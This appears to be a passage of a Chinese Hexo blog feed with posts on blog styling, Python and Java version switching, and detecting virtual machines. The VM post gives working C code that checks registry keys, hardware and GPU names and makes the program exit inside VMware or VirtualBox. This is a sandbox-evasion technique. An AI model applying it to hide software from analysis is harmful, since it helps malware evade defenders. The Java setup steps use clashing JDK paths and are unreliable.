<p>找到这个文件：<img src="/2024/07/13/PolishMyBlog/image-20240713223438190.png" alt="image-20240713223438190" style="zoom:67%;"></p>
<p>在最后添加这一段：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, .<span class="number">5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, .<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/13/PolishMyBlog/4af430ae6918c0c6c0387454921d91b.png" alt="4af430ae6918c0c6c0387454921d91b" style="zoom:50%;">

<p>这样就有边框了，边框颜色太浅不够宽就再调就可以了，学过css的都知道继续怎么折腾</p>
<p>但是发现两篇之间间隔貌似有点大，直接该上面.post中的margin是不行的</p>
<p>找到：<img src="/2024/07/13/PolishMyBlog/4a1c8635858e49dce80ff90580e7bda.png" alt="4a1c8635858e49dce80ff90580e7bda">这个地方（直接搜索就行)</p>
<p>这里本来应该是120px，该小一点间隔就变小了</p>
<img src="/2024/07/13/PolishMyBlog/4af7e4ebdc3f95f47ee6bdc1a1b9cb5.png" alt="4af7e4ebdc3f95f47ee6bdc1a1b9cb5" style="zoom: 50%;">

<h2 id="图片问题"><a href="#图片问题" class="headerlink" title="图片问题"></a>图片问题</h2><p>解决方法很多，这里讲一下我用的<strong>hexo-asset-image</strong>方法</p>
<h3 id="安装hexo-asset-image"><a href="#安装hexo-asset-image" class="headerlink" title="安装hexo-asset-image"></a>安装hexo-asset-image</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>然后修改站点配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>

<p>打开<code>node_modules/hexo-asset-image/index.js</code>，将这一大部分复制到这个位置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>)) &#123;</span><br><span class="line">          <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">          <span class="keyword">var</span> src = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span> (!(<span class="regexp">/http[s]*.*|\/\/.*/</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s+\//</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s*\/uploads|images\//</span>.<span class="title function_">test</span>(src))) &#123;</span><br><span class="line">            <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">            <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">            <span class="keyword">var</span> linkArray = link.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">elem</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">var</span> srcArray = src.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">elem</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (srcArray.<span class="property">length</span> &gt; <span class="number">1</span>)</span><br><span class="line">              srcArray.<span class="title function_">shift</span>();</span><br><span class="line">            src = srcArray.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, config.<span class="property">root</span> + link + src);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.<span class="property">root</span> + link + src);</span><br><span class="line">            <span class="comment">// $(this).attr(&#x27;src&#x27;, src);</span></span><br><span class="line">            <span class="comment">// console.info &amp;&amp; console.info(&quot;update link as:--&gt;&quot; + src);</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span> &amp;&amp; <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span> &amp;&amp; <span class="variable language_">console</span>.<span class="title function_">info</span>($(<span class="variable language_">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/13/PolishMyBlog/image-20240713224430913.png" alt="image-20240713224430913"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="配置Typora"><a href="#配置Typora" class="headerlink" title="配置Typora"></a>配置Typora</h4><p>这里改成同目录下与本文件同名文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./$&#123;filename&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/13/PolishMyBlog/image-20240713224604996.png" alt="image-20240713224604996"></p>
<h4 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h4><p>使用以下命令创建一篇文章（其实跟自己创一个文件夹再创一个md文件一样，不过这样方便）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n 名字(不要加.md)</span><br><span class="line">如 hexo n notice</span><br></pre></td></tr></table></figure>

<p>那么在_posts文件夹下面会创建一个名叫notice的文件夹和一个notice.md，这样直接复制图片到md文件中就会在同名的这个文件夹中显示</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713224906374.png" alt="image-20240713224906374"></p>
<h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>每次发布前都要执行一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>清除一下缓存，不然使用hexo-asset-image上传的图片链接会出bug，如果上传的链接出了bug，那就hexo clean一下，然后hexo g，hexo d发布就可以了</p>
<p><img src="/2024/07/13/PolishMyBlog/gifgif.gif" alt="gifgif"></p>
<p>如果不发布图片，只修改文档内容，可以不hexo clean，但是如果图片链接出错了的话，就clean一下再g &amp; d</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>Hexo NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>检测虚拟机环境</title>
    <url>/2024/07/11/DetectVM/</url>
    <content><![CDATA[<p>
    <div style="font-size: 50px; font-weight: bold;  color: black">
    检测虚拟机环境
  </div>
<br>
</p>


<p>今天在写程序时，不想让这个程序在虚拟机上运行</p>
<span id="more"></span>

<p>于是尝试了一下代码：</p>
<h2 id="注册表和硬件检测"><a href="#注册表和硬件检测" class="headerlink" title="注册表和硬件检测"></a>注册表和硬件检测</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line">BOOL <span class="title function_">CheckRegistry</span><span class="params">()</span>;</span><br><span class="line">BOOL <span class="title function_">CheckHardware</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckRegistry() || CheckHardware()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;可能运行在虚拟机中。\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未检测到虚拟机。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查注册表</span></span><br><span class="line">BOOL <span class="title function_">CheckRegistry</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    LONG lResult;</span><br><span class="line">    DWORD dwType, dwSize;</span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VMware注册表项</span></span><br><span class="line">    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\VMware, Inc.\\VMware Tools&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (lResult == ERROR_SUCCESS) &#123;</span><br><span class="line">        RegCloseKey(hKey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VirtualBox注册表项</span></span><br><span class="line">    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Oracle\\VirtualBox Guest Additions&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (lResult == ERROR_SUCCESS) &#123;</span><br><span class="line">        RegCloseKey(hKey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查硬件信息</span></span><br><span class="line">BOOL <span class="title function_">CheckHardware</span><span class="params">()</span> &#123;</span><br><span class="line">    SYSTEM_INFO sysInfo;</span><br><span class="line">    GetSystemInfo(&amp;sysInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查处理器数量</span></span><br><span class="line">    <span class="keyword">if</span> (sysInfo.dwNumberOfProcessors &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查物理内存</span></span><br><span class="line">    MEMORYSTATUSEX memInfo;</span><br><span class="line">    memInfo.dwLength = <span class="keyword">sizeof</span>(memInfo);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;memInfo);</span><br><span class="line">    <span class="keyword">if</span> (memInfo.ullTotalPhys &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123; <span class="comment">// 小于1GB</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>CheckRegistry函数</strong>：检查系统注册表中是否存在与虚拟机相关的注册表项。例如，VMware和VirtualBox在安装时会在注册表中添加特定的项。</p>
</li>
<li><p><strong>CheckHardware函数</strong>：检查系统的硬件信息，如处理器数量和物理内存大小。虚拟机通常具有较少的处理器和较小的内存。</p>
</li>
</ol>
<h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>   虚拟机可能会隐藏特征来避免被检测，在实际操作中，检测注册表确实没法判断成功程序所在环境为虚拟机，仍然能运行成功。</p>
<h2 id="GPU检测"><a href="#GPU检测" class="headerlink" title="GPU检测"></a>GPU检测</h2><p>突然想到了在打开任务管理器时，主机会显示GPU，而虚拟机不会显示GPU</p>
<p><strong>主机</strong>：<img src="/2024/07/11/DetectVM/image-20240711130459658.png" alt="image-20240711130459658" style="zoom:80%;"></p>
<p><strong>虚拟机Win11</strong>：<img src="/2024/07/11/DetectVM/image-20240711130535937.png" alt="image-20240711130535937" style="zoom:80%;"></p>
<p><strong>虚拟机Win10</strong>：<img src="/2024/07/11/DetectVM/image-20240711130613593.png" alt="image-20240711130613593" style="zoom:80%;"></p>
<h3 id="检测GPU信息"><a href="#检测GPU信息" class="headerlink" title="检测GPU信息"></a>检测GPU信息</h3><p>但是在使用程序检测GPU时，仍然在虚拟机中检测出：<img src="/2024/07/11/DetectVM/image-20240711130804118.png" alt="image-20240711130804118"></p>
<p>但是，这里发现GPU有很明显的特征，<strong>适配器名称有VMware字段</strong></p>
<p>所以，获取到GPU信息后，匹配一下适配器名称中有没有VMware或者VirtualBox字段</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 辅助函数：检查字符串是否包含特定子字符串（不区分大小写）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">containsSubstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* substr)</span> &#123;</span><br><span class="line">	<span class="type">char</span> lowerStr[<span class="number">128</span>];</span><br><span class="line">	<span class="type">char</span> lowerSubstr[<span class="number">128</span>];</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将字符串和子字符串转换为小写</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; str[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">		lowerStr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	lowerStr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; substr[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">		lowerSubstr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)substr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	lowerSubstr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strstr</span>(lowerStr, lowerSubstr) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 初始化Direct3D</span></span><br><span class="line">	IDirect3D9* pD3D = Direct3DCreate9(D3D_SDK_VERSION);</span><br><span class="line">	<span class="keyword">if</span> (pD3D == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Direct3D 初始化失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取系统中第一个显示适配器的信息</span></span><br><span class="line">	D3DADAPTER_IDENTIFIER9 adapterIdentifier;</span><br><span class="line">	HRESULT hr = pD3D-&gt;GetAdapterIdentifier(D3DADAPTER_DEFAULT, <span class="number">0</span>, &amp;adapterIdentifier);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取适配器信息失败\n&quot;</span>);</span><br><span class="line">		pD3D-&gt;Release();</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输出适配器信息</span></span><br><span class="line">	<span class="comment">/*printf(&quot;适配器名称: %s\n&quot;, adapterIdentifier.Description);</span></span><br><span class="line"><span class="comment">	printf(&quot;设备名称: %s\n&quot;, adapterIdentifier.DeviceName);</span></span><br><span class="line"><span class="comment">	printf(&quot;设备驱动版本: %d.%d.%d.%d\n&quot;,</span></span><br><span class="line"><span class="comment">		HIWORD(adapterIdentifier.DriverVersion.HighPart),</span></span><br><span class="line"><span class="comment">		LOWORD(adapterIdentifier.DriverVersion.HighPart),</span></span><br><span class="line"><span class="comment">		HIWORD(adapterIdentifier.DriverVersion.LowPart),</span></span><br><span class="line"><span class="comment">		LOWORD(adapterIdentifier.DriverVersion.LowPart));*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查适配器名称是否包含VMware或VirtualBox</span></span><br><span class="line">	<span class="keyword">if</span> (containsSubstring(adapterIdentifier.Description, <span class="string">&quot;vmware&quot;</span>) || containsSubstring(adapterIdentifier.Description, <span class="string">&quot;virtualbox&quot;</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;检测到虚拟机环境，程序将退出。\n&quot;</span>);</span><br><span class="line">		pD3D-&gt;Release();</span><br><span class="line">		Sleep(<span class="number">3000</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放Direct3D对象</span></span><br><span class="line">	pD3D-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/11/DetectVM/image-20240711131135615.png" alt="image-20240711131135615"></p>
<p>这也只是一种现在比较可行的简单的检测方法，不保证可能厂商以后把这个特征也抹除</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>Virtual Environment</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Venv pyenv update-alternatives</title>
    <url>/2024/07/07/live/</url>
    <content><![CDATA[<p>
  <div style="font-size: 40px; font-weight: bold; font-family: 'Times New Roman', serif; color: gray">
    Venv pyenv update-alternatives
  </div>
<div style="font-size: 13px; font-family: 'Times New Roman', serif; color: gray">
    2024/7/7 01:35:52
</div>


</p><h1 id="Venv-Python虚拟环境"><a href="#Venv-Python虚拟环境" class="headerlink" title="Venv Python虚拟环境"></a>Venv Python虚拟环境</h1><p>Venv，Python虚拟环境管理工具，可以创建独立的Python环境</p>
<span id="more"></span>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1.创建虚拟环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -m venv 虚拟环境名</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706203514916.png" alt="image-20240706203514916"></p>
<p>2.进入目录</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> 虚拟环境名/Scripts</span><br><span class="line">activate.bat</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706204112177.png" alt="image-20240706204112177"></p>
<p>3.激活虚拟环境后，可以在这个虚拟环境中使用<code>pip install xxx</code>安装某个项目用到的包，如果不同项目使用不同包版本，则创建多个环境，再在环境中安装不同的包。</p>
<p>电脑环境中的包：</p>
<p><img src="/2024/07/07/live/image-20240706204350565.png" alt="image-20240706204350565"> </p>
<p>虚拟环境中的包：安了一个numpy</p>
<img src="/2024/07/07/live/image-20240706204529228.png" alt="image-20240706204529228" style="zoom:67%;"> 



<h1 id="PYENV"><a href="#PYENV" class="headerlink" title="PYENV"></a>PYENV</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/pyenv-win/pyenv-win#readme">下载地址</a>:Github</p>
<p>下载解压到一个没有中文的文件夹中，将文件夹重命名为pyenv。</p>
<img src="/2024/07/07/live/image-20240706205420323.png" alt="image-20240706205420323" style="zoom:67%;">

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>复制这个路径：</p>
<p><img src="/2024/07/07/live/image-20240706205518328.png" alt="image-20240706205518328"></p>
<p>配置系统环境变量：</p>
<p><img src="/2024/07/07/live/image-20240706205707273.png" alt="image-20240706205707273"></p>
<p>在系统环境变量的Path中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%PYENV%\bin </span><br><span class="line">%PYENV%\shims</span><br></pre></td></tr></table></figure>

<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>打开cmd，直接输入pyenv</p>
<img src="/2024/07/07/live/image-20240706205935953.png" alt="image-20240706205935953" style="zoom:67%;">

<h2 id="pyenv命令"><a href="#pyenv命令" class="headerlink" title="pyenv命令"></a>pyenv命令</h2><p>查看pyenv-win支持的python版本列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv install --list</span><br></pre></td></tr></table></figure>
<p>查看当前python对应版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure>
<p>查看电脑安装的所有python版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure>
<p>安装指定版本 || 也可以在一个命令中安装多个版本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv install &lt;version&gt; || pyenv install &lt;version&gt; &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>卸载指定版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv uninstall &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>将python版本设置为全局版本(默认使用的python版本) 注意：必须先安装该版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv global &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>设置本地版本(当在此文件夹中调用python时，都会使用给定的版本。) 注意：必须先安装该版本。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>查看python版本来核对：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -V</span><br></pre></td></tr></table></figure>

<h2 id="pyenv安装python环境"><a href="#pyenv安装python环境" class="headerlink" title="pyenv安装python环境"></a>pyenv安装python环境</h2><p>1.查看可以安装的版本</p>
<p><img src="/2024/07/07/live/image-20240706210402179.png" alt="image-20240706210402179"></p>
<p>2.安装需要的Python版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv install &lt;version&gt;</span><br></pre></td></tr></table></figure>

<p>解决安装慢、安装超时问题：</p>
<p>打开<code>pyenv/pyenv-win/.versions_cache.xml</code>，将其中的下载地址改成华为云的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mirrors.huaweicloud.com/python/</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/07/live/image-20240706221134067.png" alt="image-20240706221134067"></p>
<p>接着就下好了：</p>
<p><img src="/2024/07/07/live/image-20240706221302932.png" alt="image-20240706221302932"></p>
<p>4.设置Python版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv global &lt;version&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706224136656.png" alt="image-20240706224136656"></p>
<h1 id="update-alternatives"><a href="#update-alternatives" class="headerlink" title="update-alternatives"></a>update-alternatives</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h2 id="1-查看Python版本"><a href="#1-查看Python版本" class="headerlink" title="1.查看Python版本"></a>1.查看Python版本</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /usr/bin/python*</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240707003021725.png" alt="image-20240707003021725"></p>
<p>有2.7和3.11两个版本</p>
<h2 id="2-当前版本"><a href="#2-当前版本" class="headerlink" title="2.当前版本"></a>2.当前版本</h2><img src="/2024/07/07/live/image-20240707003246279.png" alt="image-20240707003246279" style="zoom:80%;">

<h2 id="3-设置默认版本（设置优先级）"><a href="#3-设置默认版本（设置优先级）" class="headerlink" title="3.设置默认版本（设置优先级）"></a>3.设置默认版本（设置优先级）</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240707003543304.png" alt="image-20240707003543304"></p>
<h2 id="4-切换版本"><a href="#4-切换版本" class="headerlink" title="4.切换版本"></a>4.切换版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure>

<img src="/2024/07/07/live/image-20240707003630386.png" alt="image-20240707003630386" style="zoom:67%;">

<p>输入编号开启手动模式即可</p>
<p><img src="/2024/07/07/live/image-20240707003713895.png" alt="image-20240707003713895"></p>
<p>这样Python版本就换成了2.7</p>
<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>首先查看一下已安装的Java版本：</p>
<p><img src="/2024/07/07/live/image-20240707005540546.png" alt="image-20240707005540546"></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先来安装一个Java1.8 [下载地址](<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java Archive Downloads - Java SE 8 (oracle.com)</a>)</p>
<img src="/2024/07/07/live/image-20240707011244573.png" alt="image-20240707011244573" style="zoom:67%;">

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/java</span><br><span class="line"><span class="built_in">cp</span> jdk-8u251-linux-x64.tar.gz  /usr/local/java</span><br><span class="line">tar -zxvf jdk-8u251-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>



<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>将解压的jdk放到&#x2F;usr&#x2F;local中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> jdk1.8.0_202 /usr/local</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入环境变量 复制到最下面</span></span><br><span class="line">JAVA_HOME=/usr/local/java/jdk1.8.0_251 </span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通知Java目录</span></span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/java&quot;</span> <span class="string">&quot;java&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/java&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javac&quot;</span> <span class="string">&quot;javac&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javac&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br></pre></td></tr></table></figure>

<img src="/2024/07/07/live/image-20240707012540159.png" alt="image-20240707012540159" style="zoom:50%;">

<p><img src="/2024/07/07/live/image-20240707012757430.png" alt="image-20240707012757430"></p>
<h3 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h3><p><img src="/2024/07/07/live/image-20240707013016446.png" alt="image-20240707013016446"></p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>网络编程</title>
    <url>/2024/07/05/CInternet/</url>
